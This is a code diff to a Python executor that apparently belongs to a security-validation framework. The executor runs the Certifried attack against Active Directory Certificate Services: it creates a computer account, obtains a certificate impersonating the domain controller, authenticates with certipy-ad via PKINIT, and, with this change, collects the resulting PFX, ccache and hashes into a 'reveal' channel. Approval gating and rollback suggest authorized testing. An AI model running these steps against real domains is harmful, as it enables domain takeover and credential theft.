@@ -48,7 +48,8 @@ from ..recommend import (ParamSpec, ParamValue, values,
                          validate_sam_name, sam_name_warning)
 from .. import proof
 from .. import states
-from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
+from ._reveal_common import key_material, pkinit_hashes
+from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                    redact_argv, Capability, CAP_CCACHE)
 from .coercion import machine_account, _short_name
 
@@ -172,7 +173,18 @@ class CertifriedExecutor(ValidationExecutor):
         return netresolve.nxc_auth_flags(cfg)
 
     # ---------------------------------------------------------------- execute
+    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
+        return list(artifact.get("_reveal", []))
+
     def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
+        # Private recovery channel, populated before downstream proof/cleanup.
+        artifact = {"_reveal": []}
+        ctx._pending_reveal_artifact = artifact
+
+        def finish_artifact(*args):
+            artifact.update(self._artifact(*args))
+            return artifact
+
         cfg = ctx.config
         v = values(params)
         ca_host = v["ca_host"]
@@ -202,7 +214,7 @@ class CertifriedExecutor(ValidationExecutor):
             gate["classifier"] = "denied"
             gate["op"] = "certifried_account_create"
             errors.append("gate_denied:certifried_account_create")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
         if verdict == "approved":
             gate["classifier"] = "approved"
             gate["op"] = "certifried_account_create"
@@ -215,7 +227,7 @@ class CertifriedExecutor(ValidationExecutor):
                note="computer created" if create_ok else "create failed")
         if not create_ok:
             errors.append("account_create_failed")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
         mutation["applied"] = True                       # a computer WAS created
 
         # 2) request a Machine-template cert on the (unpatched) CA ------------
@@ -225,12 +237,14 @@ class CertifriedExecutor(ValidationExecutor):
         req_out = (res.stdout or "") + (res.stderr or "")
         issued_ok = bool(_RE_REQ_ISSUED.search(req_out))
         pfx = self._parse_pfx(req_out, out_dir, new)     # secret path
+        impersonated = machine_account(dc_fqdn) or (f"{_short_name(dc_fqdn)}$" if dc_fqdn else "<dc>$")
+        artifact["_reveal"].extend(key_material(self.technique, "pfx", impersonated, pfx))
         record("cert_request", req_argv, res, issued_ok,
                note="cert issued" if issued_ok else "request failed")
         if not issued_ok:
             errors.append("cert_request_failed")
             self._rollback(ctx, cfg, new, dc_fqdn, op_auth, mutation, steps, errors, pfx, None, record)
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
 
         # 3) PKINIT with the issued pfx -> authenticate AS the DC -------------
         auth_argv = ["certipy-ad", "auth", "-pfx", pfx, "-dc-ip", dc]
@@ -239,12 +253,13 @@ class CertifriedExecutor(ValidationExecutor):
         auth_out = (res.stdout or "") + (res.stderr or "")
         auth_ok = bool(_RE_AUTH_OK.search(auth_out))
         ccache = self._parse_ccache(auth_out, out_dir)
+        artifact["_reveal"].extend(key_material(self.technique, "ccache", impersonated, ccache))
+        artifact["_reveal"].extend(pkinit_hashes(self.technique, impersonated, auth_out))
         record("cert_auth", auth_argv, res, auth_ok,
                note="pkinit ok" if auth_ok else "pkinit failed")
         if not auth_ok:
             errors.append("cert_auth_failed")
 
-        impersonated = machine_account(dc_fqdn) or (f"{_short_name(dc_fqdn)}$" if dc_fqdn else "<dc>$")
         cert_used_ok = bool(issued_ok and auth_ok)
         terminal_fact = proof.build_terminal_fact(
             self.terminal_kind, ok=cert_used_ok, impersonated=impersonated,
@@ -264,7 +279,7 @@ class CertifriedExecutor(ValidationExecutor):
                 name="rollback_deferred", ok=True, argv_display=[], returncode=None,
                 note="rollback DEFERRED to chain teardown (composed front)"))
             complete = bool(issued_ok and auth_ran)
-            artifact = self._artifact(steps, gate, mutation, terminal_fact, complete, errors)
+            finish_artifact(steps, gate, mutation, terminal_fact, complete, errors)
             artifact["teardown_obligation"] = {
                 "method": "certipy account delete + LDAP read-back + destroy pfx",
                 "computer": new, "dc_fqdn": dc_fqdn, "pfx": pfx, "ccache": ccache}
@@ -277,7 +292,7 @@ class CertifriedExecutor(ValidationExecutor):
         if mutation["applied"]:
             errors.append(f"advisory:rotate_credentials:{impersonated}@{cfg.domain}")
         complete = bool(issued_ok and auth_ran and mutation["rollback"]["performed"])
-        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)
+        return finish_artifact(steps, gate, mutation, terminal_fact, complete, errors)
 
     # ---------------------------------------------------------------- composition (C)
     def produced(self, ctx, finding, params, artifact) -> list[Capability]:
